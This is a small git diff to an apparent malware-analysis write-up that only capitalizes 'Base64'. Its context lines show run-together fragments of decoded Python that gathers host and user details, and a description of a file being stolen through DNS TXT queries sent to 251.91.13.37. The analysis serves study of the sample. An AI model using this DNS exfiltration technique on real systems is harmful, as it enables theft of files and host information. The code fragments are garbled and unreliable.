@@ -62,7 +62,7 @@ index 7461804..126a027 100644
 ```
 ## Decoding
 
-I performed base64 decoding on the string.
+I performed Base64 decoding on the string.
 
 Encoded string:
 ```python
@@ -93,7 +93,7 @@ from base64 import urlsafe_b64encodefrom io import BytesIOfrom dns.message impor
 f"{os.uname().sysname}.{os.uname().machine}.{os.uname().nodename}.{os.getlogin()}"_ = f"{os.uname().sysname}.{os.uname().machine}.{os.uname().nodename}.{os.getlogin()}"q(source, 0o34)
 ```
 
-This code is sending DNS queries over UDP to IP address `251.91.13.37` on port DNS. It reads and compresses a file, encodes it as base64, and splits it into chunks. The chunks get embedded in DNS TXT queries. System information gets sent in a DNS AAAA query.
+This code is sending DNS queries over UDP to IP address `251.91.13.37` on port DNS. It reads and compresses a file, encodes it as Base64, and splits it into chunks. The chunks get embedded in DNS TXT queries. System information gets sent in a DNS AAAA query.
 
 ## Appendix
 
